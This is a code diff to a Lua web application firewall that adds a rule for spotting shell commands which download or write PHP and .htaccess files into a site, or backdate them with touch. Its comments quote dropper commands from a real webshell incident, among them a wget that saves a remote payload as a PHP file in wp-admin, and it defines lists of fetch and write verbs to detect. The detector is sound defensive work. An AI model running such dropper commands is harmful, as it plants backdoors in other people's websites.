@@ -3850,6 +3850,7 @@ end
 -- in detect_upload_filename (rule 401): .php[%d]* / .phtm[l] / .pht / .phar. If
 -- that set grows, grow this too (they intentionally match the same engine-mapped
 -- extensions; bad_fname is a nested local, so this is a parallel matcher).
+-- Rule 331 (SHW.is_exec) reuses it for a shell command's output name.
 local function _cve_sfl_has_exec_ext(s)
   if s:find("%.pht%f[%W]")       then return true end  -- .pht
   if s:find("%.phtml?%f[%W]")    then return true end  -- .phtm / .phtml
@@ -7910,6 +7911,363 @@ function _M.detect_wp_admin_cross_screen(method, uri, args, body, headers, cooki
   if not ep.xhr and hdr_lower(headers, "sec-fetch-mode", "Sec-Fetch-Mode") == "navigate" and dest == "document"
      and hdr_lower(headers, "sec-fetch-user", "Sec-Fetch-User") == "" then
     return ep.tag .. ":NO_ACTIVATION"
+  end
+  return nil
+end
+
+-- Rule 331 — a shell command that writes an executable file into the site or
+-- backdates one (logonly). The tophair.gr webshell (2026-10-08, a WPCode
+-- snippet serving a file manager and a terminal at /?dark&term=1) wrote its
+-- droppers with commands POSTed in a form field, and rules 310-317 read the
+-- query string only: a replay of `wget -q https://kaye1337.pages.dev/stfu/m.jpg
+-- -O wp-admin/css/colors/midnight/colors.php`, `curl -o x.php URL`,
+-- `echo <b64> | base64 -d > x.php` and `touch -d '2025-07-10 20:39' g.php` in a
+-- POST body matched nothing. This reads the decoded args AND body.
+--
+-- Fires on a command at a command position (the start of a value; after
+-- `;` `|` `&&` `` ` `` `$(` or a newline; inside a JSON value or sh -c '…';
+-- behind an absolute path or a prefix word such as sudo / nohup) that:
+--   * FETCH_TO_EXEC — wget / curl with its output (-O, -o, --output,
+--     --output-document; or curl -O of a URL ending in one) going to an
+--     executable name; "-O -" is stdout (the wp-cron line), not a file;
+--   * REDIRECT_TO_EXEC — echo / printf / cat / base64 / xxd / wget / curl /
+--     perl / python / php / openssl / gzip output redirected (> or >>) to an
+--     executable name, or a tee to one;
+--   * TOUCH_BACKDATE — touch -d / -t / -r / --date / --reference before its
+--     first operand: the mtime backdating that made g.php look a year old.
+-- Executable: rule 401's PHP set (.php[0-9]*, .phtm[l], .pht, .phar), .inc,
+-- .htaccess, .user.ini. Form values never carry these; a tutorial pasted into
+-- a comment, or staff saving a how-to post, could, which is why it starts
+-- logonly. Family WAF_RCE (autoblock-armed for block hits only).
+-- Limits (docs/waf.md "Rule 331"): a command is read for 4 KB, 32 words and
+-- 256 special bytes, at most 64 commands per verb a request; a verb or name
+-- hidden by shell quoting or variables is not seen.
+local SHW = {}  -- rule 331's tables and helpers (one module local: LuaJIT caps a chunk at 200)
+SHW.fetchers = { wget = true, curl = true }
+SHW.writers = { echo = true, printf = true, cat = true, base64 = true, xxd = true, wget = true, curl = true,
+                perl = true, python = true, python3 = true, php = true, openssl = true, gzip = true, gunzip = true }
+-- The verbs, searched one by one with a plain find: a class-pattern scan of the
+-- whole surface costs ~20 ns a byte in LuaJIT (400 us on a 19 KB page-builder
+-- body), a plain find a few us. tee writes its operands (… | base64 -d | tee x.php).
+SHW.verbs = { "wget", "curl", "touch", "tee", "echo", "printf", "cat", "base64", "xxd", "perl", "python",
+              "python3", "php", "openssl", "gzip", "gunzip" }
+-- Words that run the word after them as a command (sudo wget …).
+SHW.prefix = { sudo = true, nohup = true, env = true, exec = true, command = true, busybox = true,
+               nice = true, time = true, xargs = true }
+-- Bytes that open a command: = ; | & ` and newline. '(' only as "$(", ':' only
+-- before a JSON value's quote (at_command), never bare: "usage: echo" is prose.
+SHW.sep = { [61] = true, [59] = true, [124] = true, [38] = true, [96] = true, [10] = true, [13] = true }
+-- Blanks: space, tab, VT, FF and '+' (a form-encoded space).
+SHW.blank = { [32] = true, [9] = true, [11] = true, [12] = true, [43] = true }
+-- The byte before a verb that can begin a command position: the cheap first
+-- test, before at_command's loop. A letter (sudo wget, a JSON \n) is tested in scan.
+SHW.lead = { [34] = true, [39] = true, [40] = true, [47] = true }
+for b in pairs(SHW.sep) do SHW.lead[b] = true end
+for b in pairs(SHW.blank) do SHW.lead[b] = true end
+-- Byte classes at_command reads back over, each for a bounded length: a word
+-- before the verb (a prefix, or an assignment's value), an assignment's name,
+-- the directory of an absolute path to the verb.
+function SHW.class(chars)
+  local c = {}
+  for i = 1, #chars do c[chars:byte(i)] = true end
+  for b = 48, 57 do c[b] = true end
+  for b = 97, 122 do c[b] = true end
+  for b = 65, 90 do c[b] = true end
+  return c
+end
+SHW.word, SHW.name, SHW.path = SHW.class("_./:,@%-"), SHW.class("_"), SHW.class("_./-")
+-- Read back from k over bytes in class cls, at most cap of them.
+function SHW.back(t, k, cls, cap)
+  local stop = k - cap
+  while k > stop and k > 0 and cls[t:byte(k)] do k = k - 1 end
+  return k
+end
+
+-- Is a shell word (an output path or a URL) an executable file name? The PHP
+-- extensions are rule 401's / 10001's set (_cve_sfl_has_exec_ext: .php[0-9]*,
+-- .phtm[l], .pht, .phar), plus .inc, .htaccess and .user.ini.
+function SHW.is_exec(tok)
+  if not tok or tok == "" then return false end
+  tok = tok:gsub("^[\"']+", ""):gsub("[\"';,)}%]]+$", "")
+  tok = tok:match("^[^?#]*") or tok          -- a URL's query / fragment
+  local base = tok:match("([^/\\]*)$") or tok
+  if base == ".htaccess" or base == ".user.ini" or base:find("%.inc$") then return true end
+  local ext = base:match("%.[%w]+$")          -- the last one: x.php.txt is not run
+  return ext ~= nil and _cve_sfl_has_exec_ext(ext)
+end
+
+function SHW.alpha(b) return b ~= nil and ((b >= 97 and b <= 122) or (b >= 65 and b <= 90)) end
+
+-- Is the word at `at` in a command position? Returns false, or what opened
+-- it: true (the start of the surface), the separator's byte (124: a pipe, for
+-- tee), 40 for "$(", or the quote's byte (34 for a JSON value or sh -c "…",
+-- 39 for sh -c '…'; parse ends the command at its closing quote). Reads back over blanks
+-- (a JSON \t too; a JSON \n or \r is a newline), an absolute path to the verb
+-- (/usr/bin/wget) and up to three prefix words (sudo, nohup, …, or an
+-- assignment: HOME=/tmp wget). Every read-back is bounded, so a value of
+-- repeated verbs costs linear time. A quote after anything but ':' '[' ','
+-- (JSON) or -c is markup (class="cat"), not a command.
+function SHW.at_command(t, at)
+  local k, hops = at - 1, 0
+  if t:byte(k) == 47 then                     -- /usr/bin/wget, /sbin/…
+    if t:sub(k - 3, k) ~= "bin/" then return false end
+    k = SHW.back(t, k, SHW.path, 32)
+  end
+  while true do
+    if k < 1 then return true end             -- the start of the surface
+    local b = t:byte(k)
+    if SHW.blank[b] then
+      k = SHW.back(t, k, SHW.blank, 64)
+      if k > 0 and SHW.blank[t:byte(k)] then return false end
+    elseif SHW.sep[b] then
+      return b
+    elseif (b == 110 or b == 114 or b == 116) and t:byte(k - 1) == 92 then
+      if b ~= 116 then return 10 end          -- JSON \n / \r
+      k = k - 2                               -- JSON \t
+    elseif b == 40 then
+      return t:byte(k - 1) == 36 and 40 or false  -- $( … )
+    elseif b == 34 or b == 39 then
+      local j = SHW.back(t, k - 1, SHW.blank, 64)
+      local p = t:byte(j)
+      if b == 34 and (p == 58 or p == 91 or p == 44) then return 34 end  -- "k":"…", ["…", ,"…"
+      if p == 99 and t:byte(j - 1) == 45 and SHW.blank[t:byte(j - 2) or 32] then return b end  -- sh -c "…"
+      return false
+    elseif SHW.word[b] and hops < 3 then
+      local e = k
+      k = SHW.back(t, k, SHW.word, 64)
+      if SHW.prefix[t:sub(k + 1, e)] then     -- sudo, nohup, … (cmd=sudo wget)
+        hops = hops + 1
+      elseif t:byte(k) == 61 then             -- NAME=value
+        local ne = k - 1
+        k = SHW.back(t, ne, SHW.name, 32)
+        local p = t:byte(k)
+        -- After a blank, ; | ` a newline or '=' (cmd=HOME=/tmp wget); never
+        -- at the start or after '&', where name=value is a form field
+        -- (comment=please echo …).
+        if k == ne or k < 1 or p == 38 or not (SHW.blank[p] or SHW.sep[p]) then return false end
+        hops = hops + 1
+      else
+        return false
+      end
+    else
+      return false
+    end
+  end
+end
+
+-- The command after a verb, up to the next separator outside quotes, as shell
+-- words (quotes stripped) and the targets of its > / >> redirections. It jumps
+-- from one special character to the next (find), never char by char, builds
+-- words from a table of pieces (never a growing string), and reads at most
+-- SHW.window bytes, SHW.max_words words and SHW.max_steps special bytes (a
+-- dropper command has a handful of each; a quoted payload is one word and one
+-- step); the third result is the end of what it read.
+--
+-- It reads the raw surface, JSON included. Outside quotes: a JSON \n / \r ends
+-- the command, \t is a blank, \"…\" is a quoted string, any other \x is x (\/
+-- is /, as a shell escape too). A quote that has no closing one in the window,
+-- or that is followed by , } ] : & or the end, closes the value the command
+-- sits in (a JSON string, a form field, sh -c '…') and ends the command.
+SHW.window, SHW.max_words, SHW.max_steps = 4096, 32, 256  -- a quoted webshell body fits
+SHW.qend = { [44] = true, [125] = true, [93] = true, [58] = true, [38] = true }
+function SHW.parse(s, from)
+  local words, targets, buf = {}, {}, {}
+  local n = math.min(#s, from + SHW.window)
+  local want_target, i, steps = false, from, 0
+  local function flush()
+    if #buf > 0 then
+      local w = table.concat(buf)
+      buf = {}
+      if want_target then targets[#targets + 1] = w; want_target = false else words[#words + 1] = w end
+    end
+  end
+  while i <= n and #words + #targets < SHW.max_words and steps < SHW.max_steps do
+    steps = steps + 1
+    local j = s:find("[%s+;|&`'\">\\]", i)
+    if not j or j > n then buf[#buf + 1] = s:sub(i, n); i = n + 1; break end
+    if j > i then buf[#buf + 1] = s:sub(i, j - 1) end
+    local c = s:byte(j)
+    if c == 39 or c == 34 then                  -- ' or ": to the closing quote
+      local nx = s:byte(j + 1)
+      local k = s:find(c == 39 and "'" or '"', j + 1, true)
+      if not k or k > n or nx == nil or SHW.qend[nx] then i = j; break end  -- the value's own end
+      buf[#buf + 1] = s:sub(j + 1, k - 1); i = k + 1
+    elseif c == 62 or (c == 38 and s:byte(j + 1) == 62) then  -- > >> >| &> &>>
+      flush(); want_target = true
+      i = (c == 38) and j + 2 or j + 1
+      if s:byte(i) == 62 then i = i + 1 end
+      local nx = s:byte(i)
+      if nx == 124 or nx == 38 then i = i + 1 end  -- >| clobber; >&2 is an fd, read as a word
+    elseif c == 10 or c == 13 or c == 59 or c == 124 or c == 38 or c == 96 then
+      i = j; break                               -- \n \r ; | & `
+    elseif c == 92 then                          -- a backslash
+      local e = s:byte(j + 1)
+      if e == 110 or e == 114 then i = j; break end  -- JSON \n \r
+      if e == 116 then
+        flush(); i = j + 2                       -- JSON \t
+      elseif e == 34 then                        -- JSON \"…\"
+        local k = s:find('\\"', j + 2, true)
+        if k and k <= n then buf[#buf + 1] = s:sub(j + 2, k - 1); i = k + 2 else i = j + 2 end
+      else
+        if e then buf[#buf + 1] = string.char(e) end
+        i = j + 2
+      end
+    else
+      flush(); i = j + 1                         -- other whitespace, '+'
+    end
+  end
+  flush()
+  return words, targets, i
+end
+
+-- A URL that saves under its own file name (curl -O, plain wget): the path's
+-- last segment, with no query (wget keeps it in the name: wp-cron.php?x).
+function SHW.url_exec(w)
+  local path = w:match("^%a+://[^/?#]+(/[^#]*)$")
+  return path ~= nil and not path:find("?", 1, true) and SHW.is_exec(path)
+end
+
+function SHW.check(verb, words, targets)
+  if verb == "touch" then
+    -- An option before the first operand (touch -c -d '…' file); "--" ends them.
+    for _, w in ipairs(words) do
+      if w == "--" then break end
+      if w:sub(1, 2) == "--" then
+        if w:find("^%-%-date") or w:find("^%-%-reference") then return "TOUCH_BACKDATE" end
+      elseif w:sub(1, 1) == "-" and #w > 1 then
+        if w:find("[dtr]") then return "TOUCH_BACKDATE" end
+      else
+        break
+      end
+    end
+    return nil
+  end
+  if verb == "tee" then
+    for _, w in ipairs(words) do
+      if w:sub(1, 1) ~= "-" and SHW.is_exec(w) then return "REDIRECT_TO_EXEC" end
+    end
+    return nil
+  end
+  if SHW.fetchers[verb] then
+    -- wget with no output option saves under the URL's file name, as curl -O does.
+    local remote_name, had_out = false, false
+    for k, w in ipairs(words) do
+      local out
+      if w:find("^%-%-output%-document=") or w:find("^%-%-output=") then
+        out = w:match("=(.*)$")
+      elseif w == "--output" or w == "--output-document" then
+        out = words[k + 1]
+      elseif w == "--remote-name" then
+        remote_name = true
+      elseif w == "--spider" or w == "--delete-after" then
+        had_out = true                                  -- keeps nothing on disk
+      elseif w:find("^%-%a*o$") then
+        -- -o / -O (one after lowercasing), alone or closing a cluster: a
+        -- file name follows (wget -O x, curl -o x), "-" is stdout (the
+        -- wget -q -O - …/wp-cron.php cron line), or curl -O names the file
+        -- after the URL.
+        local nxt = words[k + 1]
+        had_out = true
+        if nxt and nxt:sub(1, 1) ~= "-" and not nxt:find("^%a+://") then
+          out = nxt
+        elseif nxt ~= "-" then
+          remote_name = true
+        end
+      elseif w:find("^%-%a*o[^%s]") and not w:find("^%-%-") then
+        out = w:match("^%-%a*o(.+)$")                 -- -ox.php
+      end
+      if out then had_out = true end
+      if out and SHW.is_exec(out) then return "FETCH_TO_EXEC" end
+    end
+    if verb == "wget" and not had_out then remote_name = true end
+    if remote_name then
+      for _, w in ipairs(words) do
+        if SHW.url_exec(w) then return "FETCH_TO_EXEC" end
+      end
+    end
+  end
+  if SHW.writers[verb] then
+    for _, t in ipairs(targets) do
+      if SHW.is_exec(t) then return "REDIRECT_TO_EXEC" end
+    end
+  end
+  return nil
+end
+
+-- Does an option (-x, '-x') follow the word ending at from, across blanks
+-- and JSON \t? (touch -d …)
+function SHW.option_next(t, p)
+  local start = p
+  while p - start < 64 do
+    local b = t:byte(p)
+    if SHW.blank[b] then p = p + 1
+    elseif b == 92 and t:byte(p + 1) == 116 then p = p + 2
+    else break end
+  end
+  if p == start then return false end
+  local b = t:byte(p)
+  if b == 34 or b == 39 then b = t:byte(p + 1) end
+  return b == 45
+end
+
+-- One verb's occurrences in t, in order; returns the tag or nil. An
+-- occurrence inside the command this verb's last parse read is an argument of
+-- it, never a command, so one verb's parses never overlap (linear in the
+-- surface), and it parses at most SHW.max_parses commands (each costs ~1.5 us,
+-- whatever its length). Its own function so its loop gets its own JIT trace
+-- (an inner loop under the verb list's loop is blacklisted and runs interpreted).
+SHW.max_parses = 64
+function SHW.scan(t, verb)
+  local parses = 0
+  local fetch, piped = SHW.fetchers[verb], verb == "tee"
+  local at, next_gt, done_to = t:find(verb, 1, true), 0, 0
+  while at do
+    local from = at + #verb
+    local nb, pb = t:byte(from) or 0, t:byte(at - 1)
+    -- The word ends here (python, not pythonic) and starts a command.
+    if at > done_to and not ((nb >= 48 and nb <= 57) or SHW.alpha(nb))
+       and (pb == nil or SHW.lead[pb] or (pb >= 97 and pb <= 122)) then
+      local cmd = SHW.at_command(t, at)
+      if cmd and (not piped or cmd == 124) then          -- tee only after a pipe
+        local go
+        if verb == "touch" then
+          go = SHW.option_next(t, from)                   -- an option must come first
+        elseif fetch or piped then
+          go = true
+        else
+          if next_gt and next_gt < from then next_gt = t:find(">", from, true) end
+          go = next_gt ~= nil and next_gt <= from + SHW.window  -- a writer needs a redirect
+        end
+        if go then
+          local words, targets, stop = SHW.parse(t, from)
+          local tag = SHW.check(verb, words, targets)
+          if tag then return tag end
+          done_to = stop
+          parses = parses + 1
+          if parses >= SHW.max_parses then return nil end
+        end
+      end
+    end
+    at = t:find(verb, from, true)
+  end
+  return nil
+end
+
+-- s: the decoded, lowercased args+body (cfm_waf's get_norm_ab). Read in place:
+-- no copy of the surface.
+function _M.detect_shell_write_exec(s)
+  if not s or s == "" then return nil end
+  -- Every write but touch's needs an executable name somewhere (each plain
+  -- find costs ~6 us on 19 KB, so a body naming none reads touch alone), and
+  -- a writer's needs a redirect.
+  local any_exec = has(s, ".ph") or has(s, ".inc") or has(s, ".htaccess") or has(s, ".user.ini")
+  if not any_exec and not has(s, "touch") then return nil end
+  local any_gt = any_exec and has(s, ">")
+  for _, verb in ipairs(SHW.verbs) do
+    if verb == "touch" or ((SHW.fetchers[verb] or verb == "tee") and any_exec) or any_gt then
+      local tag = SHW.scan(s, verb)
+      if tag then return tag end
+    end
   end
   return nil
 end
